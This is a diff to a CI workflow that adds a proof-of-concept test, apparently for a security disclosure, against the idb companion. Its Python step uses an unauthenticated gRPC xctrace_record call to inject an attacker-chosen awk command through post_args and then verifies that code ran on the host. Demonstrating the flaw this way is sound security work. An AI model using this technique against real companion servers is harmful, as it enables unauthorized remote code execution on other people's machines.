@@ -109,6 +109,55 @@ jobs:
           print(f"unauthenticated_describe_target={description['udid']}")
           PY
 
+          host_marker="$RUNNER_TEMP/idb-unauthenticated-host-rce"
+          test ! -e "$host_marker"
+          "$RUNNER_TEMP/venv/bin/python" - "$host_ip" "$port" "$host_marker" "$RUNNER_TEMP/untrusted-trace" <<'PY'
+          import asyncio
+          import logging
+          import pathlib
+          import sys
+
+          from idb.common.types import TCPAddress
+          from idb.grpc.client import Client
+
+          async def main() -> None:
+              host, port, marker, output = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
+              address = TCPAddress(host=host, port=port)
+              logger = logging.getLogger("unauthenticated-xctrace-proof")
+              async with Client.build(address=address, logger=logger, exchange_metadata=False) as client:
+                  stop = asyncio.Event()
+
+                  async def stop_later() -> None:
+                      await asyncio.sleep(3)
+                      stop.set()
+
+                  stopper = asyncio.create_task(stop_later())
+                  program = f'BEGIN {{ print "remote-host-code-executed" > "{marker}"; exit }}'
+                  try:
+                      await client.xctrace_record(
+                          stop=stop,
+                          output=output,
+                          template_name="Time Profiler",
+                          all_processes=True,
+                          time_limit=10.0,
+                          post_args=["/usr/bin/awk", program, "ignored.trace"],
+                          stop_timeout=30.0,
+                      )
+                  except Exception as error:
+                      # The attacker-selected processor intentionally does not produce the
+                      # trace path the server later tries to archive. Its side effect is the proof.
+                      print(f"postprocess_collection_error={error!r}")
+                  finally:
+                      stopper.cancel()
+
+              observed = pathlib.Path(marker).read_text()
+              assert observed == "remote-host-code-executed\n", observed
+              print("unauthenticated_xctrace_postprocessor=companion-host code executed")
+
+          asyncio.run(main())
+          PY
+          test "$(cat "$host_marker")" = 'remote-host-code-executed'
+
           repl_output="$(env -u IDB_COMPANION -u IDB_COMPANION_TLS \
             "$RUNNER_TEMP/idb-companion/idb-repl" \
             --reason 'Authorized security validation on a disposable runner' \
@@ -138,4 +187,4 @@ jobs:
             echo 'unexpected TLS listener' >&2
             exit 1
           fi
-          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs and arbitrary REPL code without credentials\n'
+          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs, companion-host postprocessor code and arbitrary REPL code without credentials\n'
